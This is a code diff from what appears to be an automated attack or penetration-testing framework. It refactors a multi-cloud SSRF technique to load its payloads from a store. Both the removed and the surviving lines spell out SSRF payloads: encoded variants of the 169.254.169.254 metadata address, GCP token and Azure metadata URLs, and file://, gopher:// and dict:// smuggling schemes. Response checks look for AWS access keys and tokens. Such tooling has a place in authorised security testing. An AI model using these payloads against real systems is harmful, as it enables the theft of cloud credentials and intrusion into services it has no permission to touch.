@@ -14,28 +14,25 @@
 import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
 import { claimFor } from './framework'
 import { EvidenceGate } from '../intelligence/evidence-gate'
+import { getPayloadStore } from '../payloads/store'
 
-const METADATA_SIGNATURES = [
-  '169.254.169.254', 'metadata.google.internal', 'metadata/computeMetadata',
-  'Metadata-Flavor', 'instance/profile', 'access_token', 'project-id',
-  'iam/security-credentials', 'imds', 'ami-id', 'InstanceMetadata',
-]
-const CRED_SIGNATURES = ['access_token', 'security-credentials', 'AKIA', 'project-id', 'service_account']
+const METADATA_SIGNATURES = () => getPayloadStore().getMarkers('ssrf/cloud-metadata')
+const CRED_SIGNATURES = () => getPayloadStore().getMarkers('ssrf/cloud-metadata').filter((m) => ['access_token', 'security-credentials', 'AKIA', 'project-id', 'service_account'].includes(m))
 
 function hasSignature(body: string): boolean {
   if (!body) return false
   const lower = body.toLowerCase()
-  return METADATA_SIGNATURES.some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
+  return METADATA_SIGNATURES().some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
 }
 function hasCredSignature(body: string): boolean {
   if (!body) return false
   const lower = body.toLowerCase()
-  return CRED_SIGNATURES.some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
+  return CRED_SIGNATURES().some((s) => lower.includes(s.toLowerCase())) || /\bAKIA[0-9A-Z]{16}\b/i.test(body)
 }
 
-// IP-encoding bypasses (data, not logic) — decimal/hex/octal/IPv6 render of 169.254.169.254.
-const IP_ENCODINGS = ['169.254.169.254', '0251.0376.0251.0376', '0xA9.0xFE.0xA9.0xFE', '2852039166', '[::ffff:169.254.169.254]']
-const PROTO_SCHEMES = ['file:///etc/passwd', 'gopher://169.254.169.254:80/', 'dict://169.254.169.254:11211/']
+// IP-encoding bypasses + protocol smuggling loaded from payloads/ssrf/ip-encodings.json
+const IP_ENCODINGS = () => getPayloadStore().getPayloads('ssrf/ip-encodings', 'aws')
+const PROTO_SCHEMES = () => getPayloadStore().getPayloads('ssrf/ip-encodings', 'protocol_smuggling')
 
 function injectParam(base: string, param: string, payload: string, method: string): { url: string; body?: string } {
   if (method !== 'GET') return { url: base, body: JSON.stringify({ [param]: payload }) }
@@ -59,7 +56,7 @@ export const ssrfMultiCloud: TechniquePrimitive = {
     const steps: AttackStep[] = []
 
     // GCP metadata (needs Metadata-Flavor header).
-    for (const ip of IP_ENCODINGS) {
+    for (const ip of IP_ENCODINGS()) {
       const gcp = injectParam(base, param, `http://${ip}/computeMetadata/v1/instance/service-accounts/default/token`, method)
       steps.push({
         id: `ssrf-gcp-${ip.replace(/[^a-z0-9]/gi, '')}`,
@@ -70,7 +67,7 @@ export const ssrfMultiCloud: TechniquePrimitive = {
       })
     }
     // Azure metadata (needs Metadata:true header).
-    for (const ip of IP_ENCODINGS.slice(0, 2)) {
+    for (const ip of IP_ENCODINGS().slice(0, 2)) {
       const az = injectParam(base, param, `http://${ip}/metadata/instance?api-version=2021-02-01`, method)
       steps.push({
         id: `ssrf-azure-${ip.replace(/[^a-z0-9]/gi, '')}`,
@@ -81,7 +78,7 @@ export const ssrfMultiCloud: TechniquePrimitive = {
       })
     }
     // Protocol smuggling.
-    for (const scheme of PROTO_SCHEMES) {
+    for (const scheme of PROTO_SCHEMES()) {
       const p = injectParam(base, param, scheme, method)
       steps.push({
         id: `ssrf-proto-${scheme.split('://')[0]}`,
